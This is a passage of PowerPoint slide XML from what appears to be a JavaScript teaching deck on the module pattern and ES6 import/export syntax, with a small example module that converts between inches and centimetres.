                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> () {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        },</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      };</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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myModule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>variableName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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myModule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>functionName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B2D2BDD-4124-403A-A0A8-B1FCB9638399}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>JavaScript Modules</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184323" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5946FC0F-3D0A-438C-A2FA-69BB8EC6E469}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4276725"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>sometimes just </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;script </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="module.js"&gt;&lt;/script&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>not enough</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>ES6 offers more fine-grained way to import and export</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>} from './</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>filename.js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'; </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import * as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NewName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'./filename.js';</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>oldName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>newName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>} from './</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>filename.js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Note that import file path should include the entire path, for example </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'./filename.js' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>instead of just </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'filename.js'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>You need to use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;script type="module"&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>in HTML to enable module importing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>export </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>keyword in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>filename.js </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tells the name should be exported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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63CDE38A-778A-4D0B-B6AE-A840FE949B39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Example of Import and Export</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185347" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6F7BE73-77CB-4338-9FA2-C78B15216054}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1393825"/>
            <a:ext cx="10972800" cy="5068888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// utils3.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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INCH_IN_CM</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2.54</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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inchesToCm</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inch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>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inch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> * </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>INCH_IN_CM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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cmToInches</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cm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>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cm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>INCH_IN_CM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import</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inchesToCm</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cmToInches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> } </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>from</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'./util3.js'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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inchesToCm</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12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>as</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Util</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>from</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'./util3.js'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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Util</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inchesToCm</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12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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Util</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cmToInches</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10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import</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inchesToCm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>as</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inchConversion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> } </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>from</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'./util3.js'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
